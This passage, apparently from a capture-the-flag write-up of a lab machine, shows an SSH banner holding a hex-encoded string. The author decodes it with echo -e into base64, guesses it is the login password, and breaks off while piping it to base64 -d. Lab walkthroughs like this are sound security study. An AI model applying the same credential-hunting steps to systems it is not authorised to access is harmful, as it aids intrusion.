</span><span class='line'><span class="se">\x</span>53<span class="se">\x</span>6c<span class="se">\x</span>68<span class="se">\x</span>68<span class="se">\x</span>52<span class="se">\x</span>30<span class="se">\x</span>5a<span class="se">\x</span>56<span class="se">\x</span>56<span class="se">\x</span>6d<span class="se">\x</span>78<span class="se">\x</span>77<span class="se">\x</span>4d<span class="se">\x</span>31<span class="se">\x</span>70<span class="se">\x</span>58<span class="se">\x</span>65<span class="se">\x</span>48<span class="se">\x</span>4a<span class="se">\x</span>6c
</span><span class='line'><span class="se">\x</span>56<span class="se">\x</span>31<span class="se">\x</span>5a<span class="se">\x</span>49<span class="se">\x</span>5a<span class="se">\x</span>45<span class="se">\x</span>64<span class="se">\x</span>30<span class="se">\x</span>55<span class="se">\x</span>32<span class="se">\x</span>45<span class="se">\x</span>7a<span class="se">\x</span>51<span class="se">\x</span>58<span class="se">\x</span>64<span class="se">\x</span>58<span class="se">\x</span>62<span class="se">\x</span>46<span class="se">\x</span>5a<span class="se">\x</span>68
</span><span class='line'><span class="se">\x</span>59<span class="se">\x</span>54<span class="se">\x</span>4a<span class="se">\x</span>47<span class="se">\x</span>56<span class="se">\x</span>31<span class="se">\x</span>64<span class="se">\x</span>75<span class="se">\x</span>53<span class="se">\x</span>6d<span class="se">\x</span>6c<span class="se">\x</span>6c<span class="se">\x</span>61<span class="se">\x</span>31<span class="se">\x</span>70<span class="se">\x</span>59<span class="se">\x</span>57<span class="se">\x</span>57<span class="se">\x</span>78<span class="se">\x</span>6f
</span><span class='line'><span class="se">\x</span>51<span class="se">\x</span>31<span class="se">\x</span>52<span class="se">\x</span>47<span class="se">\x</span>55<span class="se">\x</span>6e<span class="se">\x</span>4a<span class="se">\x</span>58<span class="se">\x</span>62<span class="se">\x</span>45<span class="se">\x</span>70<span class="se">\x</span>73<span class="se">\x</span>55<span class="se">\x</span>6d<span class="se">\x</span>31<span class="se">\x</span>53<span class="se">\x</span>65<span class="se">\x</span>6c<span class="se">\x</span>6c<span class="se">\x</span>56
</span><span class='line'><span class="se">\x</span>57<span class="se">\x</span>6c<span class="se">\x</span>4e<span class="se">\x</span>68<span class="se">\x</span>56<span class="se">\x</span>6b<span class="se">\x</span>70<span class="se">\x</span>31<span class="se">\x</span>55<span class="se">\x</span>57<span class="se">\x</span>78<span class="se">\x</span>77<span class="se">\x</span>56<span class="se">\x</span>32<span class="se">\x</span>4a<span class="se">\x</span>59<span class="se">\x</span>55<span class="se">\x</span>6c<span class="se">\x</span>68<span class="se">\x</span>61
</span><span class='line'><span class="se">\x</span>52<span class="se">\x</span>45<span class="se">\x</span>5a<span class="se">\x</span>72<span class="se">\x</span>55<span class="se">\x</span>6a<span class="se">\x</span>4a<span class="se">\x</span>4b<span class="se">\x</span>53<span class="se">\x</span>56<span class="se">\x</span>52<span class="se">\x</span>74<span class="se">\x</span>61<span class="se">\x</span>46<span class="se">\x</span>4e<span class="se">\x</span>57<span class="se">\x</span>56<span class="se">\x</span>46<span class="se">\x</span>5a<span class="se">\x</span>61
</span><span class='line'><span class="se">\x</span>56<span class="se">\x</span>6c<span class="se">\x</span>63<span class="se">\x</span>78<span class="se">\x</span>4e<span class="se">\x</span>47<span class="se">\x</span>51<span class="se">\x</span>79<span class="se">\x</span>56<span class="se">\x</span>6b<span class="se">\x</span>64<span class="se">\x</span>57<span class="se">\x</span>62<span class="se">\x</span>6c<span class="se">\x</span>4a<span class="se">\x</span>72<span class="se">\x</span>55<span class="se">\x</span>6b<span class="se">\x</span>56<span class="se">\x</span>4b
</span><span class='line'><span class="se">\x</span>62<span class="se">\x</span>31<span class="se">\x</span>6c<span class="se">\x</span>59<span class="se">\x</span>63<span class="se">\x</span>45<span class="se">\x</span>64<span class="se">\x</span>6c<span class="se">\x</span>56<span class="se">\x</span>6c<span class="se">\x</span>4a<span class="se">\x</span>7a<span class="se">\x</span>56<span class="se">\x</span>6d<span class="se">\x</span>35<span class="se">\x</span>4f<span class="se">\x</span>57<span class="se">\x</span>47<span class="se">\x</span>4a<span class="se">\x</span>47
</span><span class='line'><span class="se">\x</span>63<span class="se">\x</span>46<span class="se">\x</span>68<span class="se">\x</span>5a<span class="se">\x</span>4d<span class="se">\x</span>47<span class="se">\x</span>68<span class="se">\x</span>4c<span class="se">\x</span>56<span class="se">\x</span>32<span class="se">\x</span>78<span class="se">\x</span>61<span class="se">\x</span>57<span class="se">\x</span>46<span class="se">\x</span>56<span class="se">\x</span>72<span class="se">\x</span>5a<span class="se">\x</span>47<span class="se">\x</span>46<span class="se">\x</span>57
</span><span class='line'><span class="se">\x</span>56<span class="se">\x</span>31<span class="se">\x</span>4a<span class="se">\x</span>51<span class="se">\x</span>56<span class="se">\x</span>54<span class="se">\x</span>42<span class="se">\x</span>6b<span class="se">\x</span>52<span class="se">\x</span>31<span class="se">\x</span>49<span class="se">\x</span>79<span class="se">\x</span>52<span class="se">\x</span>6b<span class="se">\x</span>68<span class="se">\x</span>69<span class="se">\x</span>52<span class="se">\x</span>6b<span class="se">\x</span>35<span class="se">\x</span>70
</span><span class='line'><span class="se">\x</span>59<span class="se">\x</span>54<span class="se">\x</span>42<span class="se">\x</span>77<span class="se">\x</span>4d<span class="se">\x</span>6c<span class="se">\x</span>5a<span class="se">\x</span>74<span class="se">\x</span>4d<span class="se">\x</span>54<span class="se">\x</span>42<span class="se">\x</span>56<span class="se">\x</span>4d<span class="se">\x</span>55<span class="se">\x</span>31<span class="se">\x</span>34<span class="se">\x</span>56<span class="se">\x</span>56<span class="se">\x</span>68<span class="se">\x</span>73
</span><span class='line'><span class="se">\x</span>56<span class="se">\x</span>56<span class="se">\x</span>64<span class="se">\x</span>48<span class="se">\x</span>65<span class="se">\x</span>46<span class="se">\x</span>5a<span class="se">\x</span>5a<span class="se">\x</span>56<span class="se">\x</span>45<span class="se">\x</span>5a<span class="se">\x</span>33<span class="se">\x</span>59<span class="se">\x</span>55<span class="se">\x</span>5a<span class="se">\x</span>57<span class="se">\x</span>63<span class="se">\x</span>56<span class="se">\x</span>4e<span class="se">\x</span>74
</span><span class='line'><span class="se">\x</span>4f<span class="se">\x</span>56<span class="se">\x</span>64<span class="se">\x</span>53<span class="se">\x</span>62<span class="se">\x</span>45<span class="se">\x</span>70<span class="se">\x</span>5a<span class="se">\x</span>56<span class="se">\x</span>47<span class="se">\x</span>78<span class="se">\x</span>6a<span class="se">\x</span>4e<span class="se">\x</span>57<span class="se">\x</span>45<span class="se">\x</span>79<span class="se">\x</span>53<span class="se">\x</span>6b<span class="se">\x</span>64<span class="se">\x</span>6a
</span><span class='line'><span class="se">\x</span>52<span class="se">\x</span>57<span class="se">\x</span>68<span class="se">\x</span>58<span class="se">\x</span>59<span class="se">\x</span>6c<span class="se">\x</span>52<span class="se">\x</span>42<span class="se">\x</span>4d<span class="se">\x</span>56<span class="se">\x</span>5a<span class="se">\x</span>58<span class="se">\x</span>63<span class="se">\x</span>33<span class="se">\x</span>68<span class="se">\x</span>58<span class="se">\x</span>52<span class="se">\x</span>6c<span class="se">\x</span>5a<span class="se">\x</span>7a
</span><span class='line'><span class="se">\x</span>59<span class="se">\x</span>55<span class="se">\x</span>5a<span class="se">\x</span>6b<span class="se">\x</span>54<span class="se">\x</span>6c<span class="se">\x</span>59<span class="se">\x</span>79<span class="se">\x</span>61<span class="se">\x</span>44<span class="se">\x</span>4a<span class="se">\x</span>57<span class="se">\x</span>61<span class="se">\x</span>6b<span class="se">\x</span>4a<span class="se">\x</span>72<span class="se">\x</span>55<span class="se">\x</span>7a<span class="se">\x</span>46<span class="se">\x</span>6b
</span><span class='line'><span class="se">\x</span>56<span class="se">\x</span>31<span class="se">\x</span>5a<span class="se">\x</span>75<span class="se">\x</span>53<span class="se">\x</span>6c<span class="se">\x</span>42<span class="se">\x</span>57<span class="se">\x</span>62<span class="se">\x</span>48<span class="se">\x</span>42<span class="se">\x</span>76<span class="se">\x</span>57<span class="se">\x</span>56<span class="se">\x</span>52<span class="se">\x</span>47<span class="se">\x</span>64<span class="se">\x</span>31<span class="se">\x</span>4e<span class="se">\x</span>57
</span><span class='line'><span class="se">\x</span>57<span class="se">\x</span>6b<span class="se">\x</span>68<span class="se">\x</span>6c<span class="se">\x</span>52<span class="se">\x</span>30<span class="se">\x</span>5a<span class="se">\x</span>61<span class="se">\x</span>56<span class="se">\x</span>6d<span class="se">\x</span>31<span class="se">\x</span>53<span class="se">\x</span>52<span class="se">\x</span>31<span class="se">\x</span>52<span class="se">\x</span>73<span class="se">\x</span>57<span class="se">\x</span>6d<span class="se">\x</span>46<span class="se">\x</span>56
</span><span class='line'><span class="se">\x</span>52<span class="se">\x</span>6c<span class="se">\x</span>6c<span class="se">\x</span>35<span class="se">\x</span>59<span class="se">\x</span>55<span class="se">\x</span>5a<span class="se">\x</span>6f<span class="se">\x</span>57<span class="se">\x</span>6c<span class="se">\x</span>64<span class="se">\x</span>49<span class="se">\x</span>51<span class="se">\x</span>6c<span class="se">\x</span>68<span class="se">\x</span>56<span class="se">\x</span>4d<span class="se">\x</span>46<span class="se">\x</span>70<span class="se">\x</span>68
</span><span class='line'><span class="se">\x</span>59<span class="se">\x</span>31<span class="se">\x</span>5a<span class="se">\x</span>4f<span class="se">\x</span>63<span class="se">\x</span>56<span class="se">\x</span>56<span class="se">\x</span>73<span class="se">\x</span>57<span class="se">\x</span>6b<span class="se">\x</span>35<span class="se">\x</span>57<span class="se">\x</span>4d<span class="se">\x</span>55<span class="se">\x</span>6c<span class="se">\x</span>33<span class="se">\x</span>56<span class="se">\x</span>6c<span class="se">\x</span>52<span class="se">\x</span>4b
</span><span class='line'><span class="se">\x</span>4d<span class="se">\x</span>47<span class="se">\x</span>49<span class="se">\x</span>79<span class="se">\x</span>52<span class="se">\x</span>6b<span class="se">\x</span>64<span class="se">\x</span>54<span class="se">\x</span>62<span class="se">\x</span>6b<span class="se">\x</span>35<span class="se">\x</span>55<span class="se">\x</span>59<span class="se">\x</span>6b<span class="se">\x</span>64<span class="se">\x</span>6f<span class="se">\x</span>56<span class="se">\x</span>6c<span class="se">\x</span>5a<span class="se">\x</span>73
</span><span class='line'><span class="se">\x</span>57<span class="se">\x</span>6e<span class="se">\x</span>64<span class="se">\x</span>4e<span class="se">\x</span>4d<span class="se">\x</span>56<span class="se">\x</span>70<span class="se">\x</span>79<span class="se">\x</span>56<span class="se">\x</span>32<span class="se">\x</span>31<span class="se">\x</span>47<span class="se">\x</span>61<span class="se">\x</span>6c<span class="se">\x</span>5a<span class="se">\x</span>72<span class="se">\x</span>63<span class="se">\x</span>44<span class="se">\x</span>42<span class="se">\x</span>61
</span><span class='line'><span class="se">\x</span>52<span class="se">\x</span>57<span class="se">\x</span>51<span class="se">\x</span>77<span class="se">\x</span>56<span class="se">\x</span>6a<span class="se">\x</span>4a<span class="se">\x</span>4b<span class="se">\x</span>63<span class="se">\x</span>6c<span class="se">\x</span>4e<span class="se">\x</span>72<span class="se">\x</span>61<span class="se">\x</span>46<span class="se">\x</span>64<span class="se">\x</span>53<span class="se">\x</span>4d<span class="se">\x</span>32<span class="se">\x</span>68<span class="se">\x</span>6f
</span><span class='line'><span class="se">\x</span>56<span class="se">\x</span>6b<span class="se">\x</span>52<span class="se">\x</span>4b<span class="se">\x</span>52<span class="se">\x</span>31<span class="se">\x</span>59<span class="se">\x</span>78<span class="se">\x</span>54<span class="se">\x</span>6e<span class="se">\x</span>56<span class="se">\x</span>56<span class="se">\x</span>62<span class="se">\x</span>45<span class="se">\x</span>4a<span class="se">\x</span>58<span class="se">\x</span>55<span class="se">\x</span>6c<span class="se">\x</span>52<span class="se">\x</span>57
</span><span class='line'><span class="se">\x</span>57<span class="se">\x</span>56<span class="se">\x</span>64<span class="se">\x</span>57<span class="se">\x</span>55<span class="se">\x</span>6b<span class="se">\x</span>64<span class="se">\x</span>6b<span class="se">\x</span>4d<span class="se">\x</span>6b<span class="se">\x</span>5a<span class="se">\x</span>48<span class="se">\x</span>56<span class="se">\x</span>32<span class="se">\x</span>78<span class="se">\x</span>57<span class="se">\x</span>55<span class="se">\x</span>32<span class="se">\x</span>45<span class="se">\x</span>78
</span><span class='line'><span class="se">\x</span>63<span class="se">\x</span>48<span class="se">\x</span>4e<span class="se">\x</span>56<span class="se">\x</span>62<span class="se">\x</span>54<span class="se">\x</span>46<span class="se">\x</span>54<span class="se">\x</span>5a<span class="se">\x</span>57<span class="se">\x</span>78<span class="se">\x</span>73<span class="se">\x</span>56<span class="se">\x</span>6c<span class="se">\x</span>64<span class="se">\x</span>73<span class="se">\x</span>54<span class="se">\x</span>6d<span class="se">\x</span>68<span class="se">\x</span>53
</span><span class='line'><span class="se">\x</span>56<span class="se">\x</span>45<span class="se">\x</span>5a<span class="se">\x</span>61<span class="se">\x</span>56<span class="se">\x</span>56<span class="se">\x</span>63<span class="se">\x</span>31<span class="se">\x</span>62<span class="se">\x</span>31<span class="se">\x</span>59<span class="se">\x</span>78<span class="se">\x</span>57<span class="se">\x</span>58<span class="se">\x</span>70<span class="se">\x</span>68<span class="se">\x</span>53<span class="se">\x</span>45<span class="se">\x</span>70<span class="se">\x</span>61
</span><span class='line'><span class="se">\x</span>59<span class="se">\x</span>57<span class="se">\x</span>74<span class="se">\x</span>61<span class="se">\x</span>63<span class="se">\x</span>6c<span class="se">\x</span>56<span class="se">\x</span>71<span class="se">\x</span>52<span class="se">\x</span>6c<span class="se">\x</span>64<span class="se">\x</span>6a<span class="se">\x</span>4d<span class="se">\x</span>6b<span class="se">\x</span>5a<span class="se">\x</span>47<span class="se">\x</span>54<span class="se">\x</span>31<span class="se">\x</span>5a<span class="se">\x</span>6b
</span><span class='line'><span class="se">\x</span>56<span class="se">\x</span>31<span class="se">\x</span>5a<span class="se">\x</span>47<span class="se">\x</span>57<span class="se">\x</span>6d<span class="se">\x</span>46<span class="se">\x</span>57<span class="se">\x</span>62<span class="se">\x</span>47<span class="se">\x</span>4e<span class="se">\x</span>34<span class="se">\x</span>54<span class="se">\x</span>6b<span class="se">\x</span>64<span class="se">\x</span>52<span class="se">\x</span>65<span class="se">\x</span>56<span class="se">\x</span>5a<span class="se">\x</span>72
</span><span class='line'><span class="se">\x</span>5a<span class="se">\x</span>46<span class="se">\x</span>64<span class="se">\x</span>69<span class="se">\x</span>62<span class="se">\x</span>45<span class="se">\x</span>70<span class="se">\x</span>79<span class="se">\x</span>56<span class="se">\x</span>57<span class="se">\x</span>74<span class="se">\x</span>57<span class="se">\x</span>53<span class="se">\x</span>32<span class="se">\x</span>49<span class="se">\x</span>78<span class="se">\x</span>62<span class="se">\x</span>46<span class="se">\x</span>6c<span class="se">\x</span>6a
</span><span class='line'><span class="se">\x</span>52<span class="se">\x</span>57<span class="se">\x</span>52<span class="se">\x</span>73<span class="se">\x</span>56<span class="se">\x</span>6d<span class="se">\x</span>78<span class="se">\x</span>4b<span class="se">\x</span>65<span class="se">\x</span>6c<span class="se">\x</span>5a<span class="se">\x</span>74<span class="se">\x</span>4d<span class="se">\x</span>44<span class="se">\x</span>56<span class="se">\x</span>58<span class="se">\x</span>52<span class="se">\x</span>30<span class="se">\x</span>70<span class="se">\x</span>48
</span><span class='line'><span class="se">\x</span>59<span class="se">\x</span>30<span class="se">\x</span>5a<span class="se">\x</span>6f<span class="se">\x</span>57<span class="se">\x</span>6b<span class="se">\x</span>31<span class="se">\x</span>48<span class="se">\x</span>61<span class="se">\x</span>45<span class="se">\x</span>78<span class="se">\x</span>57<span class="se">\x</span>4d<span class="se">\x</span>6e<span class="se">\x</span>68<span class="se">\x</span>68<span class="se">\x</span>56<span class="se">\x</span>30<span class="se">\x</span>5a<span class="se">\x</span>57
</span><span class='line'><span class="se">\x</span>63<span class="se">\x</span>6c<span class="se">\x</span>70<span class="se">\x</span>48<span class="se">\x</span>52<span class="se">\x</span>6c<span class="se">\x</span>64<span class="se">\x</span>4e<span class="se">\x</span>4d<span class="se">\x</span>6d<span class="se">\x</span>68<span class="se">\x</span>4a<span class="se">\x</span>56<span class="se">\x</span>31<span class="se">\x</span>52<span class="se">\x</span>4a<span class="se">\x</span>65<span class="se">\x</span>46<span class="se">\x</span>4d<span class="se">\x</span>78
</span><span class='line'><span class="se">\x</span>53<span class="se">\x</span>58<span class="se">\x</span>68<span class="se">\x</span>6a<span class="se">\x</span>52<span class="se">\x</span>57<span class="se">\x</span>52<span class="se">\x</span>68<span class="se">\x</span>55<span class="se">\x</span>6d<span class="se">\x</span>73<span class="se">\x</span>31<span class="se">\x</span>57<span class="se">\x</span>46<span class="se">\x</span>59<span class="se">\x</span>77<span class="se">\x</span>56<span class="se">\x</span>6b<span class="se">\x</span>74<span class="se">\x</span>4e
</span><span class='line'><span class="se">\x</span>62<span class="se">\x</span>46<span class="se">\x</span>70<span class="se">\x</span>30<span class="se">\x</span>59<span class="se">\x</span>30<span class="se">\x</span>56<span class="se">\x</span>6b<span class="se">\x</span>57<span class="se">\x</span>6c<span class="se">\x</span>59<span class="se">\x</span>77<span class="se">\x</span>56<span class="se">\x</span>6a<span class="se">\x</span>52<span class="se">\x</span>57<span class="se">\x</span>62<span class="se">\x</span>47<span class="se">\x</span>68<span class="se">\x</span>76
</span><span class='line'><span class="se">\x</span>56<span class="se">\x</span>30<span class="se">\x</span>5a<span class="se">\x</span>6b<span class="se">\x</span>53<span class="se">\x</span>47<span class="se">\x</span>46<span class="se">\x</span>47<span class="se">\x</span>57<span class="se">\x</span>6c<span class="se">\x</span>70<span class="se">\x</span>69<span class="se">\x</span>57<span class="se">\x</span>47<span class="se">\x</span>68<span class="se">\x</span>6f<span class="se">\x</span>56<span class="se">\x</span>6d<span class="se">\x</span>31<span class="se">\x</span>34
</span><span class='line'><span class="se">\x</span>63<span class="se">\x</span>32<span class="se">\x</span>4e<span class="se">\x</span>73<span class="se">\x</span>5a<span class="se">\x</span>48<span class="se">\x</span>4a<span class="se">\x</span>6b<span class="se">\x</span>52<span class="se">\x</span>33<span class="se">\x</span>42<span class="se">\x</span>54<span class="se">\x</span>59<span class="se">\x</span>6b<span class="se">\x</span>5a<span class="se">\x</span>77<span class="se">\x</span>4e<span class="se">\x</span>46<span class="se">\x</span>5a<span class="se">\x</span>58
</span><span class='line'><span class="se">\x</span>4d<span class="se">\x</span>54<span class="se">\x</span>42<span class="se">\x</span>4e<span class="se">\x</span>52<span class="se">\x</span>6c<span class="se">\x</span>6c<span class="se">\x</span>34<span class="se">\x</span>56<span class="se">\x</span>32<span class="se">\x</span>35<span class="se">\x</span>4f<span class="se">\x</span>61<span class="se">\x</span>6c<span class="se">\x</span>4a<span class="se">\x</span>58<span class="se">\x</span>61<span class="se">\x</span>46<span class="se">\x</span>68<span class="se">\x</span>57
</span><span class='line'><span class="se">\x</span>61<span class="se">\x</span>6b<span class="se">\x</span>35<span class="se">\x</span>54<span class="se">\x</span>56<span class="se">\x</span>45<span class="se">\x</span>5a<span class="se">\x</span>73<span class="se">\x</span>56<span class="se">\x</span>56<span class="se">\x</span>46<span class="se">\x</span>59<span class="se">\x</span>61<span class="se">\x</span>46<span class="se">\x</span>4e<span class="se">\x</span>57<span class="se">\x</span>61<span class="se">\x</span>33<span class="se">\x</span>42<span class="se">\x</span>36
</span><span class='line'><span class="se">\x</span>56<span class="se">\x</span>6b<span class="se">\x</span>64<span class="se">\x</span>34<span class="se">\x</span>59<span class="se">\x</span>56<span class="se">\x</span>55<span class="se">\x</span>79<span class="se">\x</span>53<span class="se">\x</span>6b<span class="se">\x</span>5a<span class="se">\x</span>58<span class="se">\x</span>57<span class="se">\x</span>48<span class="se">\x</span>42<span class="se">\x</span>58<span class="se">\x</span>56<span class="se">\x</span>6c<span class="se">\x</span>5a<span class="se">\x</span>77
</span><span class='line'><span class="se">\x</span>52<span class="se">\x</span>31<span class="se">\x</span>51<span class="se">\x</span>78<span class="se">\x</span>57<span class="se">\x</span>6b<span class="se">\x</span>4e<span class="se">\x</span>56<span class="se">\x</span>62<span class="se">\x</span>45<span class="se">\x</span>4a<span class="se">\x</span>56<span class="se">\x</span>54<span class="se">\x</span>55<span class="se">\x</span>51<span class="se">\x</span>77<span class="se">\x</span>50<span class="se">\x</span>51<span class="se">\x</span>3d<span class="se">\x</span>3d
</span><span class='line'>
</span><span class='line'> .o88o. oooo   o8o            oooo
</span><span class='line'> <span class="m">888</span> <span class="sb">`</span><span class="s2">&quot; `888   `&quot;</span><span class="s1">&#39;            `888</span>
</span><span class='line'><span class="s1">o888oo   888  oooo   .ooooo.   888  oooo</span>
</span><span class='line'><span class="s1"> 888     888  `888  d88&#39;</span> <span class="sb">`</span><span class="err">&quot;</span>Y8  <span class="m">888</span> .8P<span class="s1">&#39;</span>
</span><span class='line'><span class="s1"> 888     888   888  888        888888.</span>
</span><span class='line'><span class="s1"> 888     888   888  888   .o8  888 `88b.</span>
</span><span class='line'><span class="s1">o888o   o888o o888o `Y8bod8P&#39;</span> o888o o888o
</span><span class='line'>
</span><span class='line'>blah@192.168.0.106<span class="err">&#39;</span>s password:
</span></code></pre></td></tr></table></div></figure>


<p>OK, that&rsquo;s something - I&rsquo;m intrigued to see what the hex decodes to</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@pwk:~# <span class="nb">echo</span> -e <span class="s2">&quot;\x56\x6d\x30\x77\x64\x32\x51\x79\x55\x58\x6c\x56\x57\x47\x78\x57\x56\x30\x64\x34</span>
</span><span class='line'><span class="s2">&gt; \x56\x31\x59\x77\x5a\x44\x52\x57\x4d\x56\x6c\x33\x57\x6b\x52\x53\x57\x46\x4a\x74</span>
</span><span class='line'><span class="s2">&gt; \x65\x46\x5a\x56\x4d\x6a\x41\x31\x56\x6a\x41\x78\x56\x32\x4a\x45\x54\x6c\x68\x68</span>
</span><span class='line'><span class="s2">&gt; \x4d\x6b\x30\x78\x56\x6d\x70\x4b\x53\x31\x49\x79\x53\x6b\x56\x55\x62\x47\x68\x6f</span>
</span><span class='line'><span class="s2">&gt; \x54\x56\x68\x43\x55\x56\x5a\x74\x65\x46\x5a\x6c\x52\x6c\x6c\x35\x56\x47\x74\x73</span>
</span><span class='line'><span class="s2">&gt; \x61\x6c\x4a\x74\x61\x47\x39\x55\x56\x6d\x68\x44\x56\x56\x5a\x61\x63\x56\x46\x74</span>
</span><span class='line'>
</span><span class='line'><span class="s2">************************************** SNIP **************************************</span>
</span><span class='line'><span class="s2">&gt; \x56\x30\x5a\x6b\x53\x47\x46\x47\x57\x6c\x70\x69\x57\x47\x68\x6f\x56\x6d\x31\x34</span>
</span><span class='line'><span class="s2">&gt; \x63\x32\x4e\x73\x5a\x48\x4a\x6b\x52\x33\x42\x54\x59\x6b\x5a\x77\x4e\x46\x5a\x58</span>
</span><span class='line'><span class="s2">&gt; \x4d\x54\x42\x4e\x52\x6c\x6c\x34\x56\x32\x35\x4f\x61\x6c\x4a\x58\x61\x46\x68\x57</span>
</span><span class='line'><span class="s2">&gt; \x61\x6b\x35\x54\x56\x45\x5a\x73\x56\x56\x46\x59\x61\x46\x4e\x57\x61\x33\x42\x36</span>
</span><span class='line'><span class="s2">&gt; \x56\x6b\x64\x34\x59\x56\x55\x79\x53\x6b\x5a\x58\x57\x48\x42\x58\x56\x6c\x5a\x77</span>
</span><span class='line'><span class="s2">&gt; \x52\x31\x51\x78\x57\x6b\x4e\x56\x62\x45\x4a\x56\x54\x55\x51\x77\x50\x51\x3d\x3d&quot;</span>
</span><span class='line'>Vm0wd2QyUXlVWGxWV0d4
</span><span class='line'>V1YwZDRWMVl3WkRSWFJt
</span><span class='line'>eFZVMjA1VjAxV2JETlhh
</span><span class='line'>Mk0xVmpKS1IySkVUbGho
</span><span class='line'>TVhCUVZteFZlRll5VGts
</span><span class='line'>alJtaG9UVmhDVVZacVFt
</span><span class='line'>RlpWMDE1VTJ0V1ZXSkhh
</span><span class='line'>
</span><span class='line'>******* SNIP *******
</span><span class='line'>V0ZkSGFGWlpiWGhoVm14
</span><span class='line'>c2NsZHJkR3BTYkZwNFZX
</span><span class='line'>MTBNRll4V25OalJXaFhW
</span><span class='line'>ak5TVEZsVVFYaFNWa3B6
</span><span class='line'>Vkd4YVUySkZXWHBXVlZw
</span><span class='line'><span class="nv">R1QxWkNVbEJVTUQwPQ</span><span class="o">==</span>
</span></code></pre></td></tr></table></div></figure>


<p>Oooh, base64 - this has to be the password !</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@pwk:~# <span class="nb">echo</span> <span class="s2">&quot;Vm0wd2QyUXlVWGxWV0d4V1YwZDRWMVl3WkRSWFJteFZVMjA1VjAxV2JETlhhMk0xVmpKS1IySkVUbGhoTVhCUVZteFZlRll5VGtsalJtaG9UVmhDVVZacVFtRlpWMDE1VTJ0V1ZXSkhhRzlVVmxaM1ZsWmFkR05GWkZSTmF6RTFWVEowVjFaWFNraGhSemxWVmpOT00xcFZXbUZrUjA1R1drWndWMDFFUlRGV1ZFb3dWakZhV0ZOcmFHaFNlbXhXVm0xNFlVMHhXbk5YYlVaclVqQTFSMWRyV2xOVWJVcEdZMFZ3VjJKVVJYZFpla3BIVmpGT2RWVnRhRk5sYlhoWFZtMXdUMVF3TUhoalJscFlZbFZhY2xWcVFURlNNVlY1VFZSU1ZrMXJjRmhWTW5SM1ZqSktWVkpZWkZwbGEzQklWbXBHVDJSV1ZuUmhSazVzWWxob1dGWnRNSGhPUm14V1RVaG9XR0pyTlZsWmJGWmhZMnhXYzFWclpGaGlSM1F6VjJ0U1UxWnJNWEpqUm1oV1RXNVNNMVpxU2t0V1ZrcFpXa1p3VjFKV2NIbFdWRUpoVkRKT2RGSnJaRmhpVjNoVVdWUk9RMWRHV25STlZFSlhUV3hHTlZaWE5VOVhSMHBJVld4c1dtSkhhRlJXTUZwVFZqRndSMVJ0ZUdsU2JYY3hWa1phVTFVeFduSk5XRXBxVWxkNGFGVXdhRU5UUmxweFUydGFiRlpzV2xwWGExcDNZa2RGZWxGcmJGZFdNMEpJVmtSS1UxWXhWblZWYlhCVFlrVndWVlp0ZUc5Uk1XUnpWMjVLV0dKSFVtOVVWbHBYVGxaYVdHVkhkR2hpUlhBd1dWVm9UMVp0Um5KT1ZsSlhUVlp3V0ZreFdrdGpiVkpIVld4a2FWSnRPVE5XTW5oWFlqSkZlRmRZWkU1V1ZscFVXV3RrVTFsV1VsWlhiVVpzWWtad2VGVXlkREJXTVZweVYyeHdXbFpXY0hKV1ZFWkxWMVpHY21KR1pGZE5NRXBKVm10U1MxVXhXWGhhU0ZaVllrWktjRlpxVG05V1ZscEhXVE5vYVUxWFVucFdNV2h2V1ZaS1IxTnVRbFZXTTFKNlZHdGFhMk5zV25Sa1JtUnBWbGhDTlZkVVFtRmpNV1IwVTJ0a1dHSlhhR0ZVVmxwM1pXeHJlV1ZIZEd0U2EzQXdXbFZhYTJGV1duSmlla1pYWWxoQ1RGUnJXbEpsUm1SellVWlNhVkp1UWxwV2JYUlhaREZrUjJKSVRtaFNWVFZaVlcxNGQyVkdWblJrUkVKb1lYcEdlVlJzVm5OWGJGcFhZMGhLV2xaWFVrZGFWV1JQVTBkR1IyRkhiRk5pYTBwMlZtMTBVMU14VVhsVVdHeFZZVEZ3YUZWcVNtOVdSbEpZVGxjNWEySkdjRWhXYlRBMVZXc3hXRlZzYUZkTlYyaDJWakJrUzFkV1ZuSlBWbHBvWVRGd1NWWkhlR0ZaVm1SR1RsWmFVRll5YUZoWldIQlhVMFphY1ZOcVVsWk5WMUl3VlRKMGIyRkdTbk5UYkdoVlZsWndNMVpyV21GalZrcDBaRWQwVjJKclNraFdSM2hoVkRKR1YxTnVVbEJXUlRWWVdWUkdkMkZHV2xWU2ExcHNVbTFTZWxsVldsTmhSVEZaVVc1b1YxWXphSEpaYWtaclVqRldjMkZGT1ZkV1ZGWmFWbGN4TkdReVZrZFdibEpyVWtWS2IxbFljRWRsVmxKelZtMDVXR0pHY0ZoWk1HaExWMnhhV0ZWclpHRldNMmhJV1RJeFMxSXhjRWRhUms1WFYwVktNbFp0Y0VkWlYwVjRWbGhvV0ZkSGFGWlpiWGhoVm14c2NsZHJkR3BTYkZwNFZXMTBNRll4V25OalJXaFhWak5TVEZsVVFYaFNWa3B6Vkd4YVUySkZXWHBXVlZwR1QxWkNVbEJVTUQwPQ==&quot;</span> <span class="p">|</span> base64 -d
